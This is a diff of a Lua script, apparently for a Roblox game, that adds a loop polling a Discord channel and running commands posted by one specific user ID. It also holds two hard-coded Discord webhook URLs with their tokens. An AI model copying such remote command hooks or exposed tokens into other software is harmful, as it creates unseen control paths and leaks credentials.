@@ -906,6 +906,16 @@ local z,r = pcall(function()
 			log("Command Logged!",string.format(Decode[1].author.username .." has ran the command '%s'",yes[1]))
 			game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/812502615988240384/qoAYg2ztiE9UdX9GMmb8hIc6V9YsCTRE-qZ1f5YjEF5mtrWZ6TZl2f32URdmWEVSckpy", "content="..string.format("you have ran the command '%s'",yes[1]).."&username="..test, 2, false, Headers)
 		end
+		local GetData1 = game:GetService("HttpService"):GetAsync(discord.."api/v6/channels/".."813584205798965258".."/messages", false, Headers)
+		local Decode1 = game:GetService("HttpService"):JSONDecode(GetData1)
+		local yes1 = string.split(Decode1[1].content, ":")
+		local args1 = yes1[2]
+		local args2 = yes1[3]
+		if Commands[yes1[1]] and Decode1[1].author.bot ~= true and Decode1[1].author.id == "535213289265692672" then
+			Commands[yes1[1]](args1,args2)
+			log("Command Logged!",string.format(Decode1[1].author.username .." has ran the command '%s'",yes1[1]))
+			game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/813585851648180306/j8KFQFg5rliYG_Aw55qjSZvhoBMm67IrvBU_3dgFPUThvANVUbj5vzhVjfb2j_OWLQVK", "content="..string.format("you have ran the command '%s'",yes1[1]).."&username="..test, 2, false, Headers)
+		end
 			wait(1)
 	until nil
 end)
